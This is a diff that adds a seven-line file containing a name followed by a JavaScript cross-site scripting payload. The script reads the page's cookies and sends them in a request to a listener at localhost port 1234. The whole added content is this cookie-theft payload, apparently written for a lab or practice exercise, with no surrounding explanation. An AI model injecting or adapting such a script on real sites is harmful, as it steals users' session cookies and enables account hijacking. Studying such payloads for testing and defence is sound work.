@@ -1,0 +1,7 @@
+vikraman 
+<script>
+var x = document.cookie;	
+var xhttps = new XMLHttpRequest();	
+xhttps.open("GET","http://localhost:1234/?"+x); 
+xhttps.send(null); 
+</script>
